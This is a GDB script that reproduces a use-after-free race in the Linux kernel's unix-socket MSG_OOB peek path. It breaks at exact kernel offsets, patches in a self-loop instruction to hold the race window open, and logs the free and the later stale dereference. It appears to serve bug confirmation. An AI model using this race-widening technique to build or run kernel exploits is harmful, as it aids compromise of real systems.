set pagination off
set confirm off
set breakpoint pending on
set logging file runtime-gdb-new.txt
set logging overwrite on
set logging enabled on
target remote :12102

set $saved_skb = 0

# Stop the MSG_OOB|MSG_PEEK receiver after unix_stream_recv_urg() has
# dropped the socket state lock.  A two-byte self-loop holds that CPU at
# the actor entry while the replacement sender runs on CPU 1.
break unix_stream_read_actor if ((((struct unix_stream_read_state *)$rcx)->flags & 3) == 3)
commands 1
  silent
  set $saved_skb = $rdi
  printf "VICTIM_BEFORE_READ skb=%p users=%d flags=%x\n", $saved_skb, ((struct sk_buff *)$saved_skb)->users.refs.counter, ((struct unix_stream_read_state *)$rcx)->flags
  bt 8
  disable 1
  set {unsigned short}unix_stream_read_actor = 0xfeeb
  continue
end

break __kfree_skb if $saved_skb != 0 && $rdi == $saved_skb
commands 2
  silent
  printf "FREE_BEGIN skb=%p users=%d\n", $rdi, ((struct sk_buff *)$rdi)->users.refs.counter
  bt 12
  continue
end

# Exact target instruction immediately after queue_oob()'s consume_skb(old).
break *(queue_oob+0x191) if $saved_skb != 0
commands 3
  silent
  printf "FREE_COMPLETED skb=%p\n", $saved_skb
  x/16gx $saved_skb
  set {unsigned short}unix_stream_read_actor = 0x1f0f
  continue
end

# First stale-object field read in unix_stream_read_actor().
break *(unix_stream_read_actor+8) if $saved_skb != 0 && $rdi == $saved_skb
commands 4
  silent
  printf "STALE_DEREFERENCE skb=%p at unix_stream_read_actor+8 after kmem_cache_free completed\n", $rdi
  printf "replacement oob_skb=%p\n", ((struct unix_sock *)((struct unix_stream_read_state *)$rcx)->socket->sk)->oob_skb
  bt 10
  set logging enabled off
  detach
  quit
end

continue
